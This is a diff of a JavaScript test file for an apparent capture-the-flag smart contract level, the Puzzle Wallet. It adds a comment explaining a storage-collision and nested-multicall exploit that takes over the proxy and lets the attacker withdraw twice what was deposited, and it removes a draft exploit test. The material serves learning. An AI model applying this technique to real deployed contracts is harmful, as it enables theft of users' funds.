@@ -39,6 +39,20 @@ describe("Level 24 - Puzzle wallet contract hack", () => {
     
     describe("When hacking", () => {
         it("Check hack", async() => {
+            /*
+             * This is an accurate example of storage collision in the context of upgradeable contracts.
+             * The PuzzleWallet implementation owner variable matches the proxy pendingAdmin slot when modifying through a delegatecall.
+             * The same happens between maxBalance and admin.
+             * 
+             * The hacker can call proposeNewAdmin(), which in turn gives ownership when executing delegating to a privileged function from the implementation.
+             * Then, in order to bypass the single Deposit call restriction, the hacker can pass two data pieces through multicall:
+             * * The first data argument calls for the deposit method.
+             * * The second one calls for the multicall method itself, which internally calls for the deposit method.
+             * 
+             * That way, the check is bypassed and the hacker can withdraw twice as much as he has deposited.
+             * 
+             * Lesson: be aware of storage collision!
+            **/
             const {owner, admin, hacker, iface, implementation, proxy, proxyAttached} = await loadFixture(setUp);
 
             // The hacker hijacks the proxy.
@@ -71,42 +85,5 @@ describe("Level 24 - Puzzle wallet contract hack", () => {
         });
 
         // To be done: execute everything using the interface calls, instead of the proxyAttached object.
-        /*
-        it("Hacker should claim ownership by overriding through proposeNewAdmin(), then ...", async() => {
-            const {owner, admin, hacker, iface, implementation, proxy, proxyAttached} = await loadFixture(setUp);
-            
-            // We asume that both the owner and the admin deposit 2 eth on the contract -after being added to the whitelist.
-            const whitelistOwnerEncodedData = iface.encodeFunctionData("addToWhitelist", [owner.address]);
-            const whitelistAdminEncodedData = iface.encodeFunctionData("addToWhitelist", [admin.address]);
-            const depositEncodedData = iface.encodeFunctionData("deposit", []);
-            
-            console.log("Whitelist owner encoded data:", whitelistOwnerEncodedData);
-            console.log("Deposit encoded data:", depositEncodedData);
-
-            await owner.sendTransaction({to: await proxy.getAddress(), data: whitelistOwnerEncodedData});
-            await owner.sendTransaction({to: await proxy.getAddress(), data: whitelistAdminEncodedData});
-            
-            console.log("Owner whitelisted:", await proxyAttached.connect(owner).whitelisted(owner.address));
-            
-            // After whitelisted, both the owner and admin deposit 0.25 eth into the contract.
-            await owner.sendTransaction({to: await proxy.getAddress(), data: depositEncodedData, value: ethers.parseEther("0.25")});
-            await admin.sendTransaction({to: await proxy.getAddress(), data: depositEncodedData, value: ethers.parseEther("0.25")});
-
-            // We check the deposit is aknowledged by the balances mapping.
-            expect(await proxyAttached.balances(owner.address)).to.equal(ethers.parseEther("0.25"));
-            expect(await proxyAttached.balances(admin.address)).to.equal(ethers.parseEther("0.25"));
-            
-            // Then the hacker hijacks the proxy.
-            expect(await proxy.pendingAdmin()).to.equal(owner.address);
-
-            await proxy.connect(hacker).proposeNewAdmin(hacker.address);
-            expect(await proxy.pendingAdmin()).to.equal(hacker.address);
-            
-            // Then the hacker calls the multicall method once for executing two operations: deposit + call to multicall for deposit.
-            const multicallEncodedData = iface.encodeFunctionData("multicall", [depositEncodedData]);
-
-            await proxy.connect(hacker).
-        });
-        */
     });
 });
